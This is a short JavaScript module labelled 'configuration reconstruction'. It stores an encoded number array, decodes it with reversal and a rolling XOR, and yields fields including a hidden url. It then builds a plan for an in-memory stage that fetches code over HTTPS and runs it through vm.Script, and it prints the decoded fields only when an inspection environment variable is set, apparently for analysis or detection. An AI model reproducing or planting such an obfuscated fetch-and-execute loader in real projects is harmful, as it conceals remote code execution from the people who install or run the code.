// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_4a89eb10 = "37,23,117,65,35,12,120,17,117,0,65,36,64,47,97,92,40,70,35,68,37,122,8,109,30,107,23,126,14,111,64,36,77,33,64,54,88,49,31,122,22,102,11,106,18,119,89,109,84,55,14,111,10,51,10,56,90,110,12,33,68,32,79,33,14,33,27,104,24,108,24,112,77,33,83,38,90,27,94,103,94,108,46,26,88,117,48,116,59,117,72,44,69,26,116,19,122,27,107,6,103,4,120,73,116,0,110,27,116,23,72,45,74,43,95,44,80,61,75,20,122,31,119,3,92,47,95,43,95,55,10,120,29,105,25,120,28,125,1,120,10,101,8,109,0,95,55,84,32,65,49,66,43,79,99,6,114,29,112,21,103,56,93,47,70,51,66,33,64,125,14,126,27,111,28,96,81,108";
const Codec_4a89eb10 = "reversed_decimal|rolling_xor|1a";

function load_4a89eb10() { Material_4a89eb10.split(",").map(Number).reverse(); return Material_4a89eb10.split(",").map(Number).reverse(); }
function decode_4a89eb10(v_a19c) { let v_e598 = 26; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }
async function recover_4a89eb10() {
  const v_c304 = [3, 5, 8, 13].slice(1, 3);
  const v_a19c = load_4a89eb10(); let v_b27e = [];
  v_b27e = await Promise.resolve(v_a19c).then(decode_4a89eb10);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_4a89eb10() { return (await recover_4a89eb10()).split("|").join("|"); }
async function plan_4a89eb10() { const inspect = inspect_4a89eb10; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_4a89eb10;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_4a89eb10());

// reconstruction complete